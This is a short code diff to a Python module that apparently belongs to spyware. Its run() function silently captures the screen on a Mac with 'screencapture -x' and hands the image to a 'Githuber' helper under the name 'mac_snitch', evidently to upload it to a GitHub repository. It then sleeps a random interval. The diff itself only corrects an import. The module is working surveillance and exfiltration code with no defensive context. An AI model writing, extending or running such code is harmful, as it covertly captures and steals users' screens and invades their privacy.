@@ -1,13 +1,13 @@
 import os
 import time
 import random
-
+import githuber
 
 def run(*args):
     os.system("screencapture -x /tmp/ss.png")
     
     payload = open("/tmp/ss.png", "rb").read()
-    git = Githuber()
+    git = githuber.Githuber()
     git.write(payload, data_name="mac_snitch", data_ext="png")
     
     time.sleep(random.randint(5, 10))
